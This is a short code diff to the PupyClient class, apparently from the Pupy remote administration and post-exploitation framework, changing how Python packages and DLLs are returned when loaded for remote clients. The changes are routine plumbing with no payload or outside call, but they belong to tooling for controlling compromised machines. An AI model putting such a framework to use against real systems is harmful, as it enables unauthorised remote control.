@@ -309,6 +309,9 @@ class PupyClient(object):
         except dependencies.NotFoundError, e:
             raise ValueError('Module not found: {}'.format(e))
 
+        if remote:
+            return packages, dlls
+
         if not contents and not dlls:
             return False
 
@@ -335,7 +338,7 @@ class PupyClient(object):
             compressed=True,
             # Use None to prevent import-then-clean-then-search behavior
             name=(
-                None if ( remote or type(requirements) != str ) else requirements
+                None if type(requirements) != str else requirements
             )
         )
 
@@ -350,13 +353,12 @@ class PupyClient(object):
         logging.debug("remote module_name asked for : %s"%module_name)
 
         try:
-            self.load_package(module_name, remote=True)
-            return True
+            return self.load_package(module_name, remote=True)
 
         except dependencies.NotFoundError:
             logging.debug("no package %s found for remote client"%module_name)
 
-        return False
+        return None, None
 
     def remote_print_error(self, msg):
         self.pupsrv.handler.display_warning(msg)
